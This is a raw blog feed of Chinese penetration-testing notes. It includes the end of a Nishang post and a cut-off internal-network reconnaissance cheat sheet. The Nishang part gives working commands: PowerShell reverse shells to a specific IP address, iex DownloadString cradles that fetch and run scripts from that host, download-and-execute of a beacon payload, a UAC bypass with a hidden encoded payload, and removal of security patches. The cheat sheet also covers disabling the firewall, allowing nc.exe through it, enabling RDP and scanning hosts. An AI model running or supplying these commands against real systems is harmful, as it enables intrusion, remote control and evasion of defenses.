src="https://img-blog.csdnimg.cn/9c9cfaad0b6e4395a2364804e85267fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-PoshRatHttp和Invoke-PoshRatHttps</strong></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>：    Invoke-PoshRatHttp  -IPAddress  <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><span class="hljs-attribute">HTTPS</span>： Invoke-PoshRatHttps  -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9d4ddd4b01dc4a7098617004189405e4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul><li><strong>下载执行</strong><br>Download_Execute是Nishang中下载执行脚本</li></ul><p>ExetoText</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#将exe转成txt</span><br>ExetoText becone.exe  c:\becone.txt<br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Utility/ExetoText.ps1&#x27;)&quot;</span>;ExetoText D:\tool\beacon.exe  D:\becone.txt<br><span class="hljs-comment">#下载并执行</span><br>Download_Execute http:<span class="hljs-regexp">//</span><span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Execution/Download_Execute.ps1&#x27;)&quot;</span>;;Download_Execute http:<span class="hljs-regexp">//</span><span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br></code></pre></td></tr></table></figure><ul><li><strong>Bypass UAC</strong></li></ul><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">#使用sysprp方法执行默认的payload<br>Invoke-PsUACme  -Verbose    <br>#使用oobe方法并执行默认的payload<br>Invoke-PsUACme  -<span class="hljs-keyword">method</span> <span class="hljs-title function_">oobe</span> -<span class="hljs-title function_">Verbose</span><br>#使用-<span class="hljs-title function_">Payload</span>参数可以自行指定执行的<span class="hljs-title function_">payload</span><br><span class="hljs-title function_">Invoke</span>-<span class="hljs-title function_">PsUACme</span>  -<span class="hljs-title function_">method</span> <span class="hljs-title function_">oobe</span> -<span class="hljs-title function_">Payload</span> &quot;<span class="hljs-title function_">powershell</span> -<span class="hljs-title function_">windowstyle</span> <span class="hljs-title function_">hidden</span> -<span class="hljs-title function_">e</span> <span class="hljs-title function_">Your</span> <span class="hljs-title function_">EncodedPayload</span>&quot;<br><br><span class="hljs-title function_">powershell</span> -<span class="hljs-title function_">nop</span> -<span class="hljs-title function_">c</span> &quot;<span class="hljs-title function_">iex</span><span class="hljs-params">(<span class="hljs-keyword">New</span>-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://1.116.233.115/nishang/Escalation/Invoke-PsUACme.ps1&#x27;</span>)</span>&quot;;Invoke-PsUACme  -Verbose    <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/034a7e7f479449f9a575333128944d3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>删除补丁</strong></li></ul><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">#</span>移除目标机器上的所有更新补丁<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-built_in">All</span><br><span class="hljs-type">#</span>移除目标机器上的所有与安全相关更新<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">Security</span><br><span class="hljs-type">#</span>移除指定编号的更新<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">KB2761226</span><br><br><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Remove-Update.ps1&#x27;)&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">KB976902</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2cb9779e2f5d4a5fa515f621762f0f20.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>nishang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>responder学习</title>
    <link href="/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="6f50a36ac93b855b7f16c3fbec1092380f2a5007b8bc7b3d70c374f2f3a14173"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>responder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CrackMapExec使用</title>
    <link href="/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/"/>
    <url>/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c7dad487946db30385888a8d40d6ed431e9a13ba92c9f1d0a0df425e6e8a3eff"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>CrackMapExec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>1.查询网络配置命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>2.查询操作系统及软件的信息<br>1）查看操作系统和版本信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br><span class="hljs-string">//</span>适用于英文的操作系统，中文的：<br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br></code></pre></td></tr></table></figure><p>2）查看系统体系结构</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> <span class="hljs-variable">%PROCESSOR_ARCHITECTURE%</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142506961.png" alt="在这里插入图片描述"></p><ol start="3"><li>查看安装的软件及版本、路径等</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142637625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>Powershell版本：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">powershell.exe &quot;Get-WmiObject -class Win32_Product | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> -Property name,Version<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142754294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.查询本机服务信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service list brief<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142926745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.查询进程列表</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">tasklist<br><span class="hljs-comment">//或者</span><br>wmic process list brief<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012114304243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>常见杀毒软件进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">360s</span>d<span class="hljs-selector-class">.exe</span><br><span class="hljs-number">360</span>tray<span class="hljs-selector-class">.exe</span><br>ZhuDongFangYu<span class="hljs-selector-class">.exe</span><br>KSafeTray<span class="hljs-selector-class">.exe</span><br>SafeDogUpdateCenter<span class="hljs-selector-class">.exe</span><br>McAfee McShield<span class="hljs-selector-class">.exe</span><br>egui<span class="hljs-selector-class">.exe</span> <span class="hljs-comment">//NOD32</span><br>AVP<span class="hljs-selector-class">.EXE</span>  <span class="hljs-comment">//卡巴斯基</span><br>avguard<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//小红伞</span><br>bdagent<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//BitDefender</span><br></code></pre></td></tr></table></figure><p>5.查看启动程序信息</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wmic startup <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span>,<span class="hljs-title">caption</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121143252334.png" alt="在这里插入图片描述"><br>6.查看计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121143341613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7.查看主机开机时间</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> statistics workstation<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121143415172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>8.查询用户列表</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><br><span class="hljs-title">//获取本地管理员组成员：</span><br><span class="hljs-title">net</span> localgroup adinistrators<br>//查看当前再线用户<br>query <span class="hljs-keyword">user</span> <span class="hljs-title">|| qwinsta</span><br></code></pre></td></tr></table></figure><p>9.列出或断开本地计算机与所连接的客户端之间的会话</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure><p>10.查询端口列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>11.查询补丁列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p>12.查询本机共享列表</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">net share<br><span class="hljs-comment">//wmic:</span><br>wmic share <span class="hljs-built_in">get</span> <span class="hljs-built_in">name</span>,path,status<br></code></pre></td></tr></table></figure><p>13.查询路由表及所有可用接口的ARP缓存表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure><p>14.查询防火墙相关配置</p><p>1）关闭防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">//windows server <span class="hljs-number">2003</span>之前<br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br>//Windows server <span class="hljs-number">2003</span>之后<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofile <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p> 2）查看防火墙配置</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">netsh firewall <span class="hljs-keyword">show </span><span class="hljs-built_in">config</span><br></code></pre></td></tr></table></figure><h4 id="3-修改防火墙配置"><a href="#3-修改防火墙配置" class="headerlink" title="3) 修改防火墙配置"></a>3) 修改防火墙配置</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之前允许指定程序全部连接<br>netsh firewall <span class="hljs-keyword">add</span> allowedprogram c:\nc.exe &quot;allow nc&quot; <span class="hljs-keyword">enable</span><br>//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之后的版本<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;pass nc&quot; dir=<span class="hljs-keyword">in</span> action=allow program=&quot;c:\nc.exe&quot;<br>//允许指定程序退出<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Allow nc&quot; dir=<span class="hljs-keyword">out</span> action=allow program=&quot;C:\nc.exe&quot;<br>//允许<span class="hljs-number">3389</span>端口放行<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Remote Desktop&quot; protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br></code></pre></td></tr></table></figure><h4 id="4-自定义防火墙日志的存储位置"><a href="#4-自定义防火墙日志的存储位置" class="headerlink" title="4)自定义防火墙日志的存储位置"></a>4)自定义防火墙日志的存储位置</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall <span class="hljs-built_in">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;C:\windows\temp\fw.log&quot;</span><br></code></pre></td></tr></table></figure><h3 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></code></pre></td></tr></table></figure><h3 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h3><h4 id="1）查看远程连接端口"><a href="#1）查看远程连接端口" class="headerlink" title="1）查看远程连接端口"></a>1）查看远程连接端口</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br></code></pre></td></tr></table></figure><h4 id="2-在Windows-server-2003中开启3389"><a href="#2-在Windows-server-2003中开启3389" class="headerlink" title="2)在Windows server 2003中开启3389"></a>2)在Windows server 2003中开启3389</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="3-在Windows-server-2008和2012中"><a href="#3-在Windows-server-2008和2012中" class="headerlink" title="3)在Windows server 2008和2012中"></a>3)在Windows server 2008和2012中</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmic /<span class="hljs-keyword">namespace</span>:\\<span class="hljs-symbol">root</span>\<span class="hljs-symbol">cimv2</span>\<span class="hljs-symbol">terminalservices</span> <span class="hljs-symbol">path</span> <span class="hljs-symbol">win32_terminalservicesetting</span> <span class="hljs-symbol">where</span> (<span class="hljs-symbol">__CLASS</span> !=&quot;&quot;) <span class="hljs-symbol">call</span> <span class="hljs-symbol">setallowtsconnections</span> <span class="hljs-symbol">1</span><br>//修改注册表方式<br><span class="hljs-symbol">reg</span> <span class="hljs-symbol">query</span> &quot;<span class="hljs-symbol">HKLM</span>\<span class="hljs-symbol">System</span>\<span class="hljs-symbol">CURRENT</span>\<span class="hljs-symbol">CONTROLSET</span>\<span class="hljs-symbol">CONTROL</span>\<span class="hljs-symbol">TERMINAL</span> <span class="hljs-symbol">SERVER</span>&quot; /<span class="hljs-symbol">v</span> <span class="hljs-symbol">fSingleSessionPerUser</span> /<span class="hljs-symbol">t</span> <span class="hljs-symbol">REG_DWORD</span> /<span class="hljs-symbol">d</span> <span class="hljs-symbol">0</span> /<span class="hljs-symbol">f</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-自动收集信息"><a href="#2-2-2-自动收集信息" class="headerlink" title="2.2.2 自动收集信息"></a>2.2.2 自动收集信息</h3><p>这里原文将上述的语句进行自动化，并将结果输出到了一个HTML文件中。</p><h3 id="2-2-3-Empire下的主机信息收集"><a href="#2-2-3-Empire下的主机信息收集" class="headerlink" title="2.2.3 Empire下的主机信息收集"></a>2.2.3 Empire下的主机信息收集</h3><p>使用模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/host/</span>winenum<br>execute<br></code></pre></td></tr></table></figure><h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>查询指定用户的详细信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> /domain<br></code></pre></td></tr></table></figure><h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><p>查看dns服务器</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gml">ipconfig /<span class="hljs-literal">all</span><br><span class="hljs-comment">//将查看到的DNS服务器用nslookup进行解析</span><br>nslookup dc.test.<span class="hljs-symbol">local</span><br></code></pre></td></tr></table></figure><p>查看系统详细信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">systeminfo | findstr <span class="hljs-regexp">/B /</span>C:<span class="hljs-string">&quot;登录服务器&quot;</span><br><span class="hljs-regexp">//</span>如果结果不为<span class="hljs-string">&quot;WORKGROUP&quot;</span>则主机为域主机<br></code></pre></td></tr></table></figure><p>查询当前登录域及登录用户信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">workstation</span><br></code></pre></td></tr></table></figure><p>判断主域</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net time /<span class="hljs-built_in">domain</span><br><span class="hljs-comment">//命令用于查看域内时间，同时也可以查看域控制器</span><br></code></pre></td></tr></table></figure><h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><p>使用nbtscan(<a href="http://www.unixwiz.net/tools/nbtscan.html)%E6%8E%A2%E6%B5%8B%E5%BD%93%E5%89%8D%E7%BD%91%E6%AE%B5%E4%B8%BB%E6%9C%BA">http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nbt</span>.exe <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>使用ICMP探测</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-s5HEC2y4-1611211198738)(2.内网信息收集.assets&#x2F;1580203080227.png)]</p><p>通过ARPscan工具扫描探测内网</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>.exe -t <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Empire中的ARPscan模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemode situational_awareness<span class="hljs-regexp">/network/</span>arpscan<br>execute<br></code></pre></td></tr></table></figure><p>Nishang中的Invoke-ARPScan.ps1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br><span class="hljs-keyword">type</span> c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br></code></pre></td></tr></table></figure><p>通过常规的TCP&#x2F;UDP端口扫描探测内网</p><p>上传ScanLine进行扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scanline</span> -h -t <span class="hljs-number">22</span>,<span class="hljs-number">80</span>-<span class="hljs-number">90</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span> -u <span class="hljs-number">53</span>,<span class="hljs-number">161</span> -O c:\windows\temp\log.txt -p <span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">254</span> /b<br></code></pre></td></tr></table></figure><h2 id="2-6扫描域内端口"><a href="#2-6扫描域内端口" class="headerlink" 